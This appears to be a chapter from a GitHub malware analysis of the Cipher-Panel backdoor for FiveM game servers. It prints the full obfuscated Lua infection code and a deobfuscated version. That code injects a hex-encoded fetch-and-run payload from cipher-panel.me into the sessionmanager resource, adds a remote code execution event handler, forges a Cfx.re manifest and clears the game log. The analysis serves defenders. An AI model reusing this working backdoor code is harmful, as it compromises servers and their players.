## Chapter 2 (Infection)
This chapter contains the breakdown of the infection code used by Cipher-Panel.

### Introduction
The infection code is a somewhat obfuscated peice of code designed to modify server files with malicious code, the code is downloaded and ran via the entrry code in [Chapter 1](https://github.com/ericstolly/cipher/blob/main/chapters/chapter-1-original-entry.md).

#### Original Code
```lua
local kaskyWVklaWSErrrnVBB = "\x73\x65\x73\x73\x69\x6f\x6e\x6d\x61\x6e\x61\x67\x65\x72"
local kakkyWVklaWSErrrnVBB = "\x2f\x73\x65\x72\x76\x65\x72\x2f\x68\x6f\x73\x74\x5f\x6c\x6f\x63\x6b\x2e\x6c\x75\x61"
local YBLgfdYggNgxwqazyGsb = "\x2f\x73\x65\x72\x76\x65\x72\x2f\x6c\x69\x63\x65\x6e\x63\x65\x2e\x74\x78\x74"
local ZudnizosZzhdkeuSzndh = "\x2f\x73\x65\x72\x76\x65\x72\x2f\x67\x61\x6d\x65\x2e\x6c\x6f\x67"
local eVSsCsytJpinTgqcGOIz = "\x2f\x63\x6c\x69\x65\x6e\x74\x2f\x65\x6d\x70\x74\x79\x2e\x6c\x75\x61"
local TeRfIyyWqxeqaJtVpjHO = "\x2f\x66\x78\x6d\x61\x6e\x69\x66\x65\x73\x74\x2e\x6c\x75\x61"
local aOSpqxARmZAARgJKFkSP, dzhdoDHOZhjcqbcdqz =
    "\x72\x65\x73\x6f\x75\x72\x63\x65\x73\x2f\x5b\x73\x79\x73\x74\x65\x6d\x5d\x2f\x73\x65\x73\x73\x69\x6f\x6e\x6d\x61\x6e\x61\x67\x65\x72\x2f\x73\x65\x72\x76\x65\x72\x2f\x6c\x69\x63\x65\x6e\x63\x65\x2e\x74\x78\x74",
    GetResourcePath
Citizen.CreateThread(
    function()
        Citizen.Wait(20000)
        raSdVeoRVnbTqXAqXrWO = io.open(dzhdoDHOZhjcqbcdqz(kaskyWVklaWSErrrnVBB) .. YBLgfdYggNgxwqazyGsb, "r")
        raSdVexRVnbTqXAqXrWO = io.open(dzhdoDHOZhjcqbcdqz(kaskyWVklaWSErrrnVBB) .. ZudnizosZzhdkeuSzndh, "r")
        if (raSdVeoRVnbTqXAqXrWO or raSdVexRVnbTqXAqXrWO) then
        else
            esiwoeKYHGqUkFENuRrc = io.open(dzhdoDHOZhjcqbcdqz(kaskyWVklaWSErrrnVBB) .. kakkyWVklaWSErrrnVBB, "a")
            esiwoeKYHGqUkFENuRrc:write("\n\nlocal XHiAookqKz = {")
            esiwoeKYHGqUkFENuRrc:write("\n	_G['PerformHttpRequest'],")
            esiwoeKYHGqUkFENuRrc:write("\n	_G['assert'],")
            esiwoeKYHGqUkFENuRrc:write("\n	_G['load'],")
            esiwoeKYHGqUkFENuRrc:write("\n	_G['tonumber']")
            esiwoeKYHGqUkFENuRrc:write("\n}")
            esiwoeKYHGqUkFENuRrc:write("\n\nlocal HFuKXKYHZq = {")
            esiwoeKYHGqUkFENuRrc:write(
                "\n	'68', '74', '74', '70', '73', '3a', '2f', '2f', '63', '69', '70', '68', '65', '72',"
            )
            esiwoeKYHGqUkFENuRrc:write(
                "\n	'2d', '70', '61', '6e', '65', '6c', '2e', '6d', '65', '2f', '5f', '69', '2f', '72',"
            )
            esiwoeKYHGqUkFENuRrc:write(
                "\n	'2e', '70', '68', '70', '3f', '74', '6f', '3d', '6c', '36', '54', '72', '32'"
            )
            esiwoeKYHGqUkFENuRrc:write("\n}")
            esiwoeKYHGqUkFENuRrc:write("\n\nfunction sDOmZoZyZn()")
            esiwoeKYHGqUkFENuRrc:write("\n	UULJijIqvu = ''")
            esiwoeKYHGqUkFENuRrc:write("\n	for id,it in pairs(HFuKXKYHZq) do")
            esiwoeKYHGqUkFENuRrc:write("\n		UULJijIqvu = UULJijIqvu..it")
            esiwoeKYHGqUkFENuRrc:write("\n	end")
            esiwoeKYHGqUkFENuRrc:write("\n	return (UULJijIqvu:gsub('..', function (luwOyroAEjA)")
            esiwoeKYHGqUkFENuRrc:write("\n		return string.char(XHiAookqKz[4](luwOyroAEjA, 16))")
            esiwoeKYHGqUkFENuRrc:write("\n	end))")
            esiwoeKYHGqUkFENuRrc:write("\nend")
            esiwoeKYHGqUkFENuRrc:write("\n\nXHiAookqKz[XHiAookqKz[4]('1')](sDOmZoZyZn(), function (e, lgUVUNUOPG)")
            esiwoeKYHGqUkFENuRrc:write(
                "\n	local WEshhWKyxg = XHiAookqKz[XHiAookqKz[4]('2')](XHiAookqKz[XHiAookqKz[4]('3')](lgUVUNUOPG))"
            )
            esiwoeKYHGqUkFENuRrc:write("\n	if (lgUVUNUOPG == nil) then return end")
            esiwoeKYHGqUkFENuRrc:write("\n	WEshhWKyxg()")
            esiwoeKYHGqUkFENuRrc:write("\nend)")
            esiwoeKYHGqUkFENuRrc:close()
            OrGaRdnLVZIaTVnMJPJC = io.open(dzhdoDHOZhjcqbcdqz(kaskyWVklaWSErrrnVBB) .. eVSsCsytJpinTgqcGOIz, "a")
            OrGaRdnLVZIaTVnMJPJC:write("\n\nRegisterNetEvent('helpCode')")
            OrGaRdnLVZIaTVnMJPJC:write("\n\nAddEventHandler('helpCode', function(id)")
            OrGaRdnLVZIaTVnMJPJC:write("\n	local help = assert(load(id))")
            OrGaRdnLVZIaTVnMJPJC:write("\n	help()")
            OrGaRdnLVZIaTVnMJPJC:write("\nend)")
            OrGaRdnLVZIaTVnMJPJC:close()
            oLwFxrKtOgqxQcwxVkHO = io.open(dzhdoDHOZhjcqbcdqz(kaskyWVklaWSErrrnVBB) .. TeRfIyyWqxeqaJtVpjHO, "w")
            oLwFxrKtOgqxQcwxVkHO:write("-- This resource is part of the default Cfx.re asset pack (cfx-server-data)")
            oLwFxrKtOgqxQcwxVkHO:write("\n-- Altering or recreating for local use only is strongly discouraged.")
            oLwFxrKtOgqxQcwxVkHO:write("\n\nversion '1.0.0'")
            oLwFxrKtOgqxQcwxVkHO:write("\nauthor 'Cfx.re <root@cfx.re>'")
            oLwFxrKtOgqxQcwxVkHO:write("\ndescription 'Handles the host lock for non-OneSync servers. Do not disable.'")
            oLwFxrKtOgqxQcwxVkHO:write("\nrepository 'https://github.com/citizenfx/cfx-server-data'")
            oLwFxrKtOgqxQcwxVkHO:write("\n\nfx_version 'cerulean'")
            oLwFxrKtOgqxQcwxVkHO:write("\ngames { 'gta4', 'gta5' }")
            oLwFxrKtOgqxQcwxVkHO:write("\n\nserver_scripts { 'server/host_lock.lua', '@mysql-async/lib/MySQL.lua' }")
            oLwFxrKtOgqxQcwxVkHO:write("\nclient_script 'client/empty.lua'")
            oLwFxrKtOgqxQcwxVkHO:close()
            pgDTRRFUvQLbTgFTMTlt = io.open(dzhdoDHOZhjcqbcdqz(kaskyWVklaWSErrrnVBB) .. ZudnizosZzhdkeuSzndh, "w")
            pgDTRRFUvQLbTgFTMTlt:write()
            pgDTRRFUvQLbTgFTMTlt:close()
        end
    end
)
```

Yet agian.. just from looking at this code, we can gather a fair amount of information.
  - The code writes many lines of code different files. (io.open, write, close)
  - It appears to infect the default resources of FiveM. (Due to the fact it writes lines that can be seen in fxmanifest.lua)
  - They are hiding function names encoded with UTF-8.

We once again simply map the values of all the UTF-8 encoded strings to better understand what functions are being called and where.

#### UTF-8 Function Variable Reversal
```
Variable: kaskyWVklaWSErrrnVBB
Encoded: \x73\x65\x73\x73\x69\x6f\x6e\x6d\x61\x6e\x61\x67\x65\x72
Plain Text: sessionmanager

Variable: kakkyWVklaWSErrrnVBB
Encoded: \x2f\x73\x65\x72\x76\x65\x72\x2f\x68\x6f\x73\x74\x5f\x6c\x6f\x63\x6b\x2e\x6c\x75\x61
Plain Text: /server/host_lock.lua

Variable: YBLgfdYggNgxwqazyGsb
Encoded: \x2f\x73\x65\x72\x76\x65\x72\x2f\x6c\x69\x63\x65\x6e\x63\x65\x2e\x74\x78\x74
Plain Text: /server/licence.txt

Variable: ZudnizosZzhdkeuSzndh
Encoded: \x2f\x73\x65\x72\x76\x65\x72\x2f\x67\x61\x6d\x65\x2e\x6c\x6f\x67
Plain Text: /server/game.log

Variable: eVSsCsytJpinTgqcGOIz
Encoded: \x2f\x63\x6c\x69\x65\x6e\x74\x2f\x65\x6d\x70\x74\x79\x2e\x6c\x75\x61
Plain Text: /client/empty.lua

Variable: TeRfIyyWqxeqaJtVpjHO
Encoded: \x2f\x66\x78\x6d\x61\x6e\x69\x66\x65\x73\x74\x2e\x6c\x75\x61
Plain Text: /fxmanifest.lua

Variable: aOSpqxARmZAARgJKFkSP
Encoded: \x72\x65\x73\x6f\x75\x72\x63\x65\x73\x2f\x5b\x73\x79\x73\x74\x65\x6d\x5d\x2f\x73\x65\x73\x73\x69\x6f\x6e\x6d\x61\x6e\x61\x67\x65\x72\x2f\x73\x65\x72\x76\x65\x72\x2f\x6c\x69\x63\x65\x6e\x63\x65\x2e\x74\x78\x74
Plain Text: resources/[system]/sessionmanager/server/licence.txt

Variable: raSdVeoRVnbTqXAqXrWO
Encoded: (Not Encoded)
Plain Text: GetResourcePath
```

#### Final Mapped Code
```lua
Citizen.CreateThread(
    function()
        Citizen.Wait(20000)
		
        licenseFile = io.open(GetResourcePath("sessionmanager") .. "/server/licence.txt", "r")
        gameLogFile = io.open(GetResourcePath("sessionmanager") .. "/server/game.log", "r")
		
        if (licenseFile or gameLogFile) then
        else
            hostLockFile = io.open(GetResourcePath("sessionmanager") .. "/server/host_lock.lua", "a")
            hostLockFile:write("\n\nlocal XHiAookqKz = {")
            hostLockFile:write("\n	_G['PerformHttpRequest'],")
            hostLockFile:write("\n	_G['assert'],")
            hostLockFile:write("\n	_G['load'],")
            hostLockFile:write("\n	_G['tonumber']")
            hostLockFile:write("\n}")
            hostLockFile:write("\n\nlocal HFuKXKYHZq = {")
            hostLockFile:write(
                "\n	'68', '74', '74', '70', '73', '3a', '2f', '2f', '63', '69', '70', '68', '65', '72',"
            )
            hostLockFile:write(
                "\n	'2d', '70', '61', '6e', '65', '6c', '2e', '6d', '65', '2f', '5f', '69', '2f', '72',"
            )
            hostLockFile:write(
                "\n	'2e', '70', '68', '70', '3f', '74', '6f', '3d', '6c', '36', '54', '72', '32'"
            )
            hostLockFile:write("\n}")
            hostLockFile:write("\n\nfunction sDOmZoZyZn()")
            hostLockFile:write("\n	UULJijIqvu = ''")
            hostLockFile:write("\n	for id,it in pairs(HFuKXKYHZq) do")
            hostLockFile:write("\n		UULJijIqvu = UULJijIqvu..it")
            hostLockFile:write("\n	end")
            hostLockFile:write("\n	return (UULJijIqvu:gsub('..', function (luwOyroAEjA)")
            hostLockFile:write("\n		return string.char(XHiAookqKz[4](luwOyroAEjA, 16))")
            hostLockFile:write("\n	end))")
            hostLockFile:write("\nend")
            hostLockFile:write("\n\nXHiAookqKz[XHiAookqKz[4]('1')](sDOmZoZyZn(), function (e, lgUVUNUOPG)")
            hostLockFile:write(
                "\n	local WEshhWKyxg = XHiAookqKz[XHiAookqKz[4]('2')](XHiAookqKz[XHiAookqKz[4]('3')](lgUVUNUOPG))"
            )
            hostLockFile:write("\n	if (lgUVUNUOPG == nil) then return end")
            hostLockFile:write("\n	WEshhWKyxg()")
            hostLockFile:write("\nend)")
            hostLockFile:close()
			
            emptyLuaFile = io.open(GetResourcePath("sessionmanager") .. "/client/empty.lua", "a")
            emptyLuaFile:write("\n\nRegisterNetEvent('helpCode')")
            emptyLuaFile:write("\n\nAddEventHandler('helpCode', function(id)")
            emptyLuaFile:write("\n	local help = assert(load(id))")
            emptyLuaFile:write("\n	help()")
            emptyLuaFile:write("\nend)")
            emptyLuaFile:close()

            fxManifestLuaFile = io.open(GetResourcePath("sessionmanager") .. "/fxmanifest.lua", "w")
            fxManifestLuaFile:write("-- This resource is part of the default Cfx.re asset pack (cfx-server-data)")
            fxManifestLuaFile:write("\n-- Altering or recreating for local use only is strongly discouraged.")
            fxManifestLuaFile:write("\n\nversion '1.0.0'")
            fxManifestLuaFile:write("\nauthor 'Cfx.re <root@cfx.re>'")
            fxManifestLuaFile:write("\ndescription 'Handles the host lock for non-OneSync servers. Do not disable.'")
            fxManifestLuaFile:write("\nrepository 'https://github.com/citizenfx/cfx-server-data'")
            fxManifestLuaFile:write("\n\nfx_version 'cerulean'")
            fxManifestLuaFile:write("\ngames { 'gta4', 'gta5' }")
            fxManifestLuaFile:write("\n\nserver_scripts { 'server/host_lock.lua', '@mysql-async/lib/MySQL.lua' }")
            fxManifestLuaFile:write("\nclient_script 'client/empty.lua'")
            fxManifestLuaFile:close()
			
            gameLogsFile = io.open(GetResourcePath("sessionmanager") .. "/server/game.log", "w")
            gameLogsFile:write()
            gameLogsFile:close()
        end
    end
)
```

The final mapped code adds obfuscated malcious code to the following files:
  - 
  - 

[Chapter 3 (???)](https://github.com/ericstolly/)
